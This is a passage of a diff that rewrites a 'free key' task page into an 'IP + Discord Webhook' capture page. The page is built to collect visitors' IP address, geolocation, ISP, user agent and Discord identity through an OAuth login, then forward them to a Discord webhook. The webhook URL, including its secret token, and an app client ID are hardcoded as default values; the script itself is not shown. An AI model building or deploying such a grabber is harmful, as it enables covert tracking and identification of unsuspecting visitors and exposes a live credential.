@@ -1,474 +1,1052 @@
 <!DOCTYPE html>
-<html lang="en">hwi
+<html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Cheap – Get Your Free Key</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com"/>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet"/>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IP + Discord Webhook</title>
+  <meta name="description" content="Capture visitor IP metadata and Discord identity, forward via webhook." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet" />
   <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
     :root {
-      --bg:       #080c12;
-      --s1:       #0d1320;
-      --s2:       #111a2a;
-      --border:   #1c2640;
-      --accent:   #5aa9ff;
-      --accent2:  #3b82f6;
-      --green:    #22d3a0;
-      --red:      #ff4c6b;
-      --text:     #dce6f5;
-      --muted:    #5a6a8a;
-      --discord:  #5865F2;
-      --youtube:  #FF0000;
+      --bg: #0a0c12;
+      --surface: rgba(255,255,255,0.04);
+      --border: rgba(255,255,255,0.08);
+      --accent: #7c6af7;
+      --accent2: #3ecfcf;
+      --discord: #5865f2;
+      --text: #e2e4f0;
+      --muted: #6b7194;
+      --green: #3dffa0;
+      --red: #ff5f6d;
+      --yellow: #ffd166;
+      --radius: 14px;
     }
-    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;align-items:center;}
 
-    /* animated glow */
-    body::before{
-      content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 40px 20px 80px;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
       background:
-        radial-gradient(ellipse 70% 40% at 50% 0%, rgba(90,169,255,.1) 0%, transparent 70%),
-        radial-gradient(ellipse 50% 30% at 90% 90%, rgba(34,211,160,.07) 0%, transparent 60%);
+        radial-gradient(ellipse 80% 60% at 50% 0%, rgba(124,106,247,0.15) 0%, transparent 70%),
+        radial-gradient(ellipse 40% 40% at 80% 80%, rgba(62,207,207,0.08) 0%, transparent 60%);
+      pointer-events: none;
+      z-index: 0;
     }
 
-    nav{position:relative;z-index:5;width:100%;max-width:580px;display:flex;align-items:center;justify-content:space-between;padding:22px 8px 0;}
-    .logo{font-size:20px;font-weight:900;letter-spacing:3px;background:linear-gradient(90deg,var(--accent),var(--green));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
-    .nav-tag{font-size:11px;font-weight:600;color:var(--muted);letter-spacing:1px;background:rgba(90,169,255,.07);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
-
-    /* HWID bar */
-    .hwid-bar{
-      position:relative;z-index:5;
-      width:100%;max-width:580px;
-      margin:12px 8px 0;
-      background:rgba(90,169,255,.05);
-      border:1px solid rgba(90,169,255,.15);
-      border-radius:10px;
-      padding:9px 16px;
-      font-size:12px;color:var(--muted);
-      display:flex;align-items:center;gap:8px;
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
     }
-    .hwid-bar .hwid-val{color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:12px;}
-    .hwid-bar .dot{width:6px;height:6px;border-radius:50%;background:var(--green);flex-shrink:0;animation:blink 1.4s infinite;}
-    @keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
 
-    .card{position:relative;z-index:5;background:var(--s1);border:1px solid var(--border);border-radius:20px;width:100%;max-width:580px;margin:20px 8px 50px;overflow:hidden;box-shadow:0 0 0 1px rgba(90,169,255,.03),0 30px 70px rgba(0,0,0,.6);}
-
-    /* Header */
-    .card-head{background:linear-gradient(135deg,#0b1424,#0f1e35);border-bottom:1px solid var(--border);padding:28px 28px 22px;text-align:center;}
-    .hicon{width:52px;height:52px;background:linear-gradient(135deg,var(--accent2),var(--accent));border-radius:13px;display:flex;align-items:center;justify-content:center;font-size:24px;margin:0 auto 14px;box-shadow:0 6px 20px rgba(90,169,255,.3);}
-    .card-head h1{font-size:22px;font-weight:800;margin-bottom:5px;}
-    .card-head p{font-size:13px;color:var(--muted);line-height:1.55;}
-
-    /* Progress */
-    .prog-wrap{padding:18px 26px 0;}
-    .prog-row{display:flex;justify-content:space-between;font-size:11px;color:var(--muted);margin-bottom:7px;}
-    .prog-track{height:3px;background:var(--border);border-radius:99px;overflow:hidden;}
-    .prog-fill{height:100%;background:linear-gradient(90deg,var(--accent2),var(--accent));border-radius:99px;transition:width .5s cubic-bezier(.4,0,.2,1);}
-
-    /* Tasks */
-    .tasks{padding:16px 20px 20px;display:flex;flex-direction:column;gap:10px;}
-
-    .task{
-      background:var(--s2);border:1px solid var(--border);border-radius:13px;
-      display:flex;align-items:center;gap:14px;padding:14px 16px;
-      cursor:pointer;transition:all .2s;position:relative;overflow:hidden;
-      user-select:none;
+    .wrapper {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 720px;
     }
-    .task::after{content:'';position:absolute;inset:0;background:linear-gradient(100deg,transparent 50%,rgba(255,255,255,.02));opacity:0;transition:opacity .2s;}
-    .task:hover:not(.done):not(.locked)::after{opacity:1;}
-    .task:hover:not(.done):not(.locked){border-color:rgba(90,169,255,.3);transform:translateY(-1px);}
-    .task.done{border-color:rgba(34,211,160,.3);background:rgba(34,211,160,.04);pointer-events:none;}
-    .task.locked{opacity:.35;cursor:not-allowed;pointer-events:none;}
-    .task.pending{border-color:rgba(255,200,60,.3);cursor:default;pointer-events:none;}
 
-    .ticon{width:42px;height:42px;border-radius:11px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
-    .ticon.discord{background:#5865F2;}
-    .ticon.youtube{background:#FF0000;}
-    .ticon.tiktok{background:#010101;border:1px solid rgba(105,201,208,.35);}
-    .ticon svg{width:22px;height:22px;}
-
-    .tinfo{flex:1;min-width:0;}
-    .tname{font-size:13px;font-weight:700;margin-bottom:2px;}
-    .tdesc{font-size:11px;color:var(--muted);}
-
-    .tbadge{
-      flex-shrink:0;font-size:11px;font-weight:600;
-      padding:6px 13px;border-radius:8px;
-      background:rgba(90,169,255,.1);border:1px solid rgba(90,169,255,.2);
-      color:var(--accent);transition:all .15s;white-space:nowrap;
+    header {
+      text-align: center;
+      margin-bottom: 36px;
     }
-    .task:hover:not(.done):not(.locked):not(.pending) .tbadge{background:rgba(90,169,255,.2);border-color:rgba(90,169,255,.45);}
-    .task.done .tbadge{background:rgba(34,211,160,.1);border-color:rgba(34,211,160,.3);color:var(--green);}
-    .task.pending .tbadge{background:rgba(255,200,60,.1);border-color:rgba(255,200,60,.3);color:#ffc83c;}
 
-    /* locked msg */
-    .lock-msg{margin:0 20px 20px;background:rgba(90,169,255,.04);border:1px dashed rgba(90,169,255,.18);border-radius:11px;padding:13px 18px;font-size:12px;color:var(--muted);text-align:center;}
-    .lock-msg span{color:var(--accent);font-weight:700;}
-
-    /* key reveal */
-    .key-section{margin:0 20px 20px;background:var(--s2);border:1px solid var(--border);border-radius:13px;padding:20px;display:none;}
-    .key-section.show{display:block;animation:fadeUp .4s ease;}
-    @keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
-    .key-label{font-size:10px;font-weight:700;letter-spacing:1.5px;color:var(--green);text-transform:uppercase;margin-bottom:11px;}
-    .key-box{display:flex;gap:9px;}
-    .key-val{flex:1;font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:700;background:#07101a;border:1px solid var(--border);border-radius:9px;padding:11px 14px;color:var(--accent);overflow:hidden;white-space:nowrap;text-overflow:ellipsis;user-select:all;letter-spacing:.5px;}
-    .copy-btn{flex-shrink:0;background:var(--accent2);color:#fff;border:none;border-radius:9px;padding:0 18px;font-size:12px;font-weight:700;cursor:pointer;transition:all .15s;}
-    .copy-btn:hover{background:var(--accent);transform:scale(1.04);}
-    .copy-btn.ok{background:var(--green);}
-    .key-note{font-size:11px;color:var(--muted);margin-top:10px;line-height:1.7;}
-
-    footer{position:relative;z-index:5;font-size:11px;color:var(--muted);padding-bottom:28px;text-align:center;}
-    footer a{color:var(--accent);text-decoration:none;}
-
-    /* ── MODAL OVERLAY ── */
-    .overlay{
-      display:none;position:fixed;inset:0;z-index:100;
-      background:rgba(5,8,18,.82);backdrop-filter:blur(6px);
-      align-items:center;justify-content:center;
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(124,106,247,0.15);
+      border: 1px solid rgba(124,106,247,0.3);
+      color: var(--accent);
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      padding: 4px 12px;
+      border-radius: 999px;
+      margin-bottom: 16px;
     }
-    .overlay.open{display:flex;}
-    .modal{
-      background:var(--s1);border:1px solid var(--border);border-radius:18px;
-      width:100%;max-width:400px;margin:16px;
-      overflow:hidden;box-shadow:0 40px 80px rgba(0,0,0,.7);
-      animation:modalIn .25s cubic-bezier(.4,0,.2,1);
-    }
-    @keyframes modalIn{from{opacity:0;transform:scale(.94)}to{opacity:1;transform:scale(1)}}
-    .modal-head{
-      background:linear-gradient(135deg,#0b1424,#0f1e35);
-      border-bottom:1px solid var(--border);
-      padding:22px 22px 18px;
-      display:flex;align-items:center;gap:14px;
-    }
-    .modal-icon{width:44px;height:44px;border-radius:11px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
-    .modal-icon.discord{background:#5865F2;}
-    .modal-icon.youtube{background:#FF0000;}
-    .modal-icon.tiktok{background:#010101;border:1px solid rgba(105,201,208,.35);}
-    .modal-icon svg{width:22px;height:22px;}
-    .modal-title{font-size:16px;font-weight:800;}
-    .modal-sub{font-size:12px;color:var(--muted);margin-top:2px;}
 
-    .modal-body{padding:20px 22px;}
-    .modal-step{
-      background:rgba(90,169,255,.05);border:1px solid rgba(90,169,255,.12);
-      border-radius:10px;padding:13px 16px;margin-bottom:14px;
-      font-size:13px;color:var(--text);line-height:1.6;
+    .badge .dot {
+      width: 6px; height: 6px;
+      background: var(--accent);
+      border-radius: 50%;
+      animation: pulse 1.5s ease-in-out infinite;
     }
-    .modal-step strong{color:var(--accent);}
 
-    /* timer ring */
-    .timer-wrap{display:flex;align-items:center;justify-content:center;flex-direction:column;gap:8px;margin-bottom:16px;}
-    .timer-ring{position:relative;width:72px;height:72px;}
-    .timer-ring svg{transform:rotate(-90deg);}
-    .timer-ring circle{fill:none;stroke-width:5;}
-    .timer-track{stroke:var(--border);}
-    .timer-arc{stroke:var(--accent2);stroke-linecap:round;transition:stroke-dashoffset .95s linear;}
-    .timer-num{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:800;color:var(--accent);}
-    .timer-label{font-size:11px;color:var(--muted);}
-
-    /* confirm button – disabled until timer done */
-    .modal-confirm{
-      width:100%;padding:13px;border:none;border-radius:10px;
-      font-size:14px;font-weight:700;cursor:pointer;transition:all .2s;
-      background:var(--border);color:var(--muted);
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.7); }
     }
-    .modal-confirm.ready{background:var(--green);color:#000;}
-    .modal-confirm.ready:hover{filter:brightness(1.1);}
 
-    .modal-foot{padding:0 22px 16px;font-size:11px;color:var(--muted);text-align:center;}
+    h1 {
+      font-size: clamp(28px, 5vw, 42px);
+      font-weight: 700;
+      background: linear-gradient(135deg, #fff 30%, var(--accent) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -0.02em;
+      line-height: 1.1;
+    }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 14px;
+      margin-top: 8px;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px;
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      margin-bottom: 16px;
+      transition: border-color 0.3s;
+    }
+
+    .card:hover { border-color: rgba(255,255,255,0.14); }
+
+    .card-label {
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .card-label::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    /* IP display */
+    .ip-display {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    .ip-value {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: clamp(24px, 5vw, 36px);
+      font-weight: 700;
+      color: var(--accent2);
+      letter-spacing: 0.02em;
+      min-height: 44px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .spinner {
+      width: 20px; height: 20px;
+      border: 2px solid rgba(62,207,207,0.2);
+      border-top-color: var(--accent2);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .copy-btn {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid var(--border);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      font-size: 13px;
+      font-weight: 500;
+      padding: 8px 14px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .copy-btn:hover { background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); }
+    .copy-btn.copied { color: var(--green); border-color: rgba(61,255,160,0.3); }
+
+    /* Meta grid */
+    .meta-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+      gap: 12px;
+    }
+
+    .meta-item {
+      background: rgba(255,255,255,0.03);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px;
+      transition: all 0.25s;
+    }
+
+    .meta-item:hover { background: rgba(255,255,255,0.05); transform: translateY(-1px); }
+
+    .meta-key {
+      font-size: 10px;
+      font-weight: 600;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 6px;
+    }
+
+    .meta-val {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--text);
+      word-break: break-all;
+      min-height: 18px;
+    }
+
+    .skeleton {
+      height: 14px;
+      background: linear-gradient(90deg, rgba(255,255,255,0.05) 25%, rgba(255,255,255,0.1) 50%, rgba(255,255,255,0.05) 75%);
+      background-size: 200% 100%;
+      animation: shimmer 1.2s infinite;
+      border-radius: 4px;
+      width: 80%;
+    }
+
+    @keyframes shimmer { to { background-position: -200% 0; } }
+
+    /* ── Discord card ── */
+    .discord-card {
+      background: rgba(88,101,242,0.07);
+      border: 1px solid rgba(88,101,242,0.25);
+      border-radius: var(--radius);
+      padding: 24px;
+      margin-bottom: 16px;
+      backdrop-filter: blur(16px);
+      transition: border-color 0.3s;
+      animation: fadeUp 0.4s ease 0.15s both;
+    }
+
+    .discord-card:hover { border-color: rgba(88,101,242,0.45); }
+
+    .discord-card .card-label { color: #8b9af8; }
+    .discord-card .card-label::after { background: rgba(88,101,242,0.25); }
+
+    /* Client ID input row */
+    .dc-setup {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      align-items: flex-end;
+    }
+
+    .dc-setup .field-group { flex: 1; min-width: 180px; }
+
+    /* Login button */
+    .btn-discord {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 12px 18px;
+      border-radius: 10px;
+      background: var(--discord);
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      font-size: 14px;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      transition: all 0.22s;
+      white-space: nowrap;
+      box-shadow: 0 4px 20px rgba(88,101,242,0.4);
+    }
+
+    .btn-discord:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(88,101,242,0.55); }
+    .btn-discord:active { transform: translateY(0); }
+    .btn-discord:disabled { opacity: 0.45; cursor: not-allowed; transform: none; }
+
+    /* Discord user profile row */
+    .dc-profile {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 14px;
+      background: rgba(88,101,242,0.08);
+      border: 1px solid rgba(88,101,242,0.2);
+      border-radius: 10px;
+      margin-top: 14px;
+    }
+
+    .dc-avatar {
+      width: 52px; height: 52px;
+      border-radius: 50%;
+      border: 2px solid rgba(88,101,242,0.5);
+      object-fit: cover;
+      flex-shrink: 0;
+    }
+
+    .dc-avatar-placeholder {
+      width: 52px; height: 52px;
+      border-radius: 50%;
+      background: rgba(88,101,242,0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      color: var(--discord);
+    }
+
+    .dc-info { flex: 1; min-width: 0; }
+
+    .dc-username {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 16px;
+      font-weight: 700;
+      color: #fff;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .dc-username .dc-discriminator { color: var(--muted); font-weight: 400; }
+
+    .dc-id {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: #8b9af8;
+      margin-top: 3px;
+    }
+
+    .dc-badge {
+      background: rgba(61,255,160,0.12);
+      color: var(--green);
+      border: 1px solid rgba(61,255,160,0.25);
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      padding: 3px 9px;
+      border-radius: 999px;
+      flex-shrink: 0;
+    }
+
+    .dc-revoke {
+      background: rgba(255,95,109,0.1);
+      border: 1px solid rgba(255,95,109,0.2);
+      color: var(--red);
+      font-family: 'Inter', sans-serif;
+      font-size: 11px;
+      font-weight: 600;
+      padding: 5px 10px;
+      border-radius: 7px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .dc-revoke:hover { background: rgba(255,95,109,0.18); }
+
+    /* Webhook form */
+    .field-group { display: flex; flex-direction: column; gap: 8px; }
+
+    label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+
+    input[type="text"],
+    input[type="url"],
+    select,
+    textarea {
+      width: 100%;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid var(--border);
+      border-radius: 9px;
+      color: var(--text);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      padding: 12px 14px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      resize: vertical;
+    }
+
+    input:focus, select:focus, textarea:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(124,106,247,0.15);
+    }
+
+    select option { background: #1a1c28; }
+
+    .row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+    @media (max-width: 480px) { .row { grid-template-columns: 1fr; } }
+
+    .btn-group { display: flex; gap: 10px; flex-wrap: wrap; }
+
+    .btn {
+      flex: 1;
+      min-width: 120px;
+      padding: 13px 20px;
+      border-radius: 10px;
+      font-family: 'Inter', sans-serif;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      transition: all 0.22s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent) 0%, #a389f4 100%);
+      color: #fff;
+      box-shadow: 0 4px 20px rgba(124,106,247,0.35);
+    }
+
+    .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(124,106,247,0.5); }
+    .btn-primary:active { transform: translateY(0); }
+
+    .btn-secondary {
+      background: rgba(255,255,255,0.06);
+      border: 1px solid var(--border);
+      color: var(--text);
+    }
+
+    .btn-secondary:hover { background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); }
+
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+
+    .log-area {
+      background: rgba(0,0,0,0.3);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      padding: 14px;
+      max-height: 200px;
+      overflow-y: auto;
+      line-height: 1.7;
+    }
+
+    .log-area::-webkit-scrollbar { width: 5px; }
+    .log-area::-webkit-scrollbar-track { background: transparent; }
+    .log-area::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 99px; }
+
+    .log-entry { display: flex; gap: 10px; }
+    .log-time { color: var(--muted); flex-shrink: 0; }
+    .log-ok { color: var(--green); }
+    .log-err { color: var(--red); }
+    .log-info { color: var(--accent2); }
+
+    .status-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 10px;
+      border-radius: 999px;
+      font-size: 11px;
+      font-weight: 600;
+    }
+
+    .pill-ok { background: rgba(61,255,160,0.12); color: var(--green); }
+    .pill-err { background: rgba(255,95,109,0.12); color: var(--red); }
+    .pill-pending { background: rgba(124,106,247,0.12); color: var(--accent); }
+
+    footer { text-align: center; color: var(--muted); font-size: 12px; margin-top: 32px; }
+
+    .card { animation: fadeUp 0.4s ease both; }
+    .card:nth-child(1) { animation-delay: 0.05s; }
+    .card:nth-child(2) { animation-delay: 0.12s; }
+    .card:nth-child(3) { animation-delay: 0.19s; }
+    .card:nth-child(4) { animation-delay: 0.26s; }
+    .card:nth-child(5) { animation-delay: 0.33s; }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .hint {
+      font-size: 11px;
+      color: var(--muted);
+      line-height: 1.6;
+      margin-top: 4px;
+    }
+
+    .hint a { color: #8b9af8; text-decoration: none; }
+    .hint a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
 
-<!-- TASK MODAL -->
-<div class="overlay" id="overlay">
-  <div class="modal" id="modal">
-    <div class="modal-head">
-      <div class="modal-icon" id="micon"></div>
-      <div>
-        <div class="modal-title" id="mtitle">Task</div>
-        <div class="modal-sub" id="msub">Follow the steps below</div>
+<div class="wrapper">
+
+  <header>
+    <div class="badge"><span class="dot"></span>Live Capture</div>
+    <h1>IP + Discord Webhook</h1>
+    <p class="subtitle">Collect visitor IP metadata and Discord identity, fire to any endpoint</p>
+  </header>
+
+  <!-- ── IP Card ── -->
+  <div class="card">
+    <div class="card-label">Detected IP</div>
+    <div class="ip-display">
+      <div class="ip-value" id="ip-value">
+        <div class="spinner" id="ip-spinner"></div>
+        <span id="ip-text">Resolving…</span>
       </div>
-    </div>
-    <div class="modal-body">
-      <div class="modal-step" id="mstep">
-        Step instructions here.
-      </div>
-      <div class="timer-wrap">
-        <div class="timer-ring">
-          <svg width="72" height="72" viewBox="0 0 72 72">
-            <circle class="timer-track" cx="36" cy="36" r="31"/>
-            <circle class="timer-arc" id="arc" cx="36" cy="36" r="31" stroke-dasharray="194.78" stroke-dashoffset="0"/>
-          </svg>
-          <div class="timer-num" id="timerNum">30</div>
-        </div>
-        <div class="timer-label">seconds remaining</div>
-      </div>
-      <button class="modal-confirm" id="confirmBtn" disabled onclick="confirmTask()">
-        Waiting…
+      <button class="copy-btn" id="copy-btn" onclick="copyIP()" title="Copy IP">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+        Copy
       </button>
     </div>
-    <div class="modal-foot">The link has been opened in a new tab — complete the action there, then come back.</div>
   </div>
+
+  <!-- ── Meta Card ── -->
+  <div class="card">
+    <div class="card-label">Visitor Metadata</div>
+    <div class="meta-grid" id="meta-grid">
+      <div class="meta-item"><div class="meta-key">Country</div><div class="meta-val skeleton" id="m-country"></div></div>
+      <div class="meta-item"><div class="meta-key">City</div><div class="meta-val skeleton" id="m-city"></div></div>
+      <div class="meta-item"><div class="meta-key">Region</div><div class="meta-val skeleton" id="m-region"></div></div>
+      <div class="meta-item"><div class="meta-key">ISP / Org</div><div class="meta-val skeleton" id="m-org"></div></div>
+      <div class="meta-item"><div class="meta-key">Timezone</div><div class="meta-val skeleton" id="m-tz"></div></div>
+      <div class="meta-item"><div class="meta-key">Lat / Lon</div><div class="meta-val skeleton" id="m-latlon"></div></div>
+      <div class="meta-item" style="grid-column: 1 / -1">
+        <div class="meta-key">User Agent</div>
+        <div class="meta-val" id="m-ua" style="font-size:11px; word-break:break-all; color: var(--muted);">Detecting…</div>
+      </div>
+      <div class="meta-item"><div class="meta-key">Timestamp (UTC)</div><div class="meta-val" id="m-time"></div></div>
+      <div class="meta-item"><div class="meta-key">Language</div><div class="meta-val" id="m-lang"></div></div>
+    </div>
+  </div>
+
+  <!-- ── Discord OAuth2 Card ── -->
+  <div class="discord-card" id="discord-card">
+    <div class="card-label">Discord Identity</div>
+
+    <div class="dc-setup">
+      <div class="field-group">
+        <label for="dc-client-id">Discord App Client ID</label>
+        <input type="text" id="dc-client-id" placeholder="1234567890123456789" value="1490415878544687184" />
+        <span class="hint">
+          Create an app at <a href="https://discord.com/developers/applications" target="_blank" rel="noopener">discord.com/developers</a>.
+          Add <code style="color:var(--accent2)">${location.origin + location.pathname}</code> as a redirect URI.
+        </span>
+      </div>
+      <button class="btn-discord" id="dc-login-btn" onclick="discordLogin()">
+        <svg width="18" height="18" viewBox="0 0 127.14 96.36" fill="currentColor">
+          <path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0 0 32.17 16.15 77.7 77.7 0 0 0 6.89-11.11 68.42 68.42 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2a68.68 68.68 0 0 1-10.87 5.19 77 77 0 0 0 6.89 11.1 105.25 105.25 0 0 0 32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.14zM42.45 65.69C36.18 65.69 31 60 31 53s5-12.74 11.43-12.74S54 46 53.89 53s-5.05 12.69-11.44 12.69zm42.24 0C78.41 65.69 73.25 60 73.25 53s5-12.74 11.44-12.74S96.23 46 96.12 53s-5.04 12.69-11.43 12.69z"/>
+        </svg>
+        Login with Discord
+      </button>
+    </div>
+
+    <!-- Populated after login -->
+    <div id="dc-profile" style="display:none;" class="dc-profile">
+      <img id="dc-avatar-img" class="dc-avatar" src="" alt="avatar" style="display:none;" />
+      <div class="dc-avatar-placeholder" id="dc-avatar-ph">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+      </div>
+      <div class="dc-info">
+        <div class="dc-username" id="dc-username-display">—</div>
+        <div class="dc-id" id="dc-id-display">ID: —</div>
+      </div>
+      <span class="dc-badge">Linked</span>
+      <button class="dc-revoke" onclick="discordRevoke()">Unlink</button>
+    </div>
+  </div>
+
+  <!-- ── Webhook Config ── -->
+  <div class="card">
+    <div class="card-label">Webhook Configuration</div>
+    <div style="display:flex; flex-direction:column; gap:14px;">
+
+      <div class="field-group">
+        <label for="webhook-url">Webhook URL</label>
+        <input type="url" id="webhook-url" placeholder="https://discord.com/api/webhooks/…" value="https://discord.com/api/webhooks/1532962613833629867/ZMFfCTJsJ3UxL6vKpAa0opRq65-RvF20X2Ly-ZGXfmrzIdCcpVg20_BkyOnLdVLjxBjf" />
+      </div>
+
+      <div class="row">
+        <div class="field-group">
+          <label for="method-select">HTTP Method</label>
+          <select id="method-select">
+            <option value="POST">POST</option>
+            <option value="PUT">PUT</option>
+            <option value="PATCH">PATCH</option>
+          </select>
+        </div>
+        <div class="field-group">
+          <label for="format-select">Payload Format</label>
+          <select id="format-select" onchange="onFormatChange()">
+            <option value="discord">Discord Embed</option>
+            <option value="json">JSON (raw)</option>
+            <option value="slack">Slack Block</option>
+            <option value="custom">Custom Template</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="field-group" id="custom-template-group" style="display:none;">
+        <label for="custom-template">Custom JSON Template</label>
+        <textarea id="custom-template" rows="5" placeholder='{"content": "IP: {{ip}}, Discord: {{dc_username}} ({{dc_id}})"}'></textarea>
+        <span class="hint">Tokens: {{ip}} {{country}} {{city}} {{region}} {{org}} {{timezone}} {{lat}} {{lon}} {{ua}} {{timestamp}} {{lang}} {{dc_username}} {{dc_id}} {{dc_avatar}}</span>
+      </div>
+
+      <div class="field-group">
+        <label for="extra-headers">Extra Headers (JSON, optional)</label>
